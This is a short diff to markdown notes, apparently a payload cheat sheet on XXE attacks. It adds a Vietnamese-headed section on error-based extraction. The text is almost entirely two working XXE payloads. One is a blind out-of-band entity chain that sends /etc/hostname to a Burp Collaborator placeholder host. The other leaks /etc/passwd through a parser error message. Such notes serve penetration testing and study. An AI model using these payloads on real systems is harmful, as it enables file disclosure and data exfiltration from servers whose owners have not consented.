@@ -21,11 +21,20 @@
 
 ## Example
 
-blind 
+### Blind 
+
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+```
+
+Lấy dữ liệu qua thông báo lỗi
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
 %eval;
 %exfil;
 ```
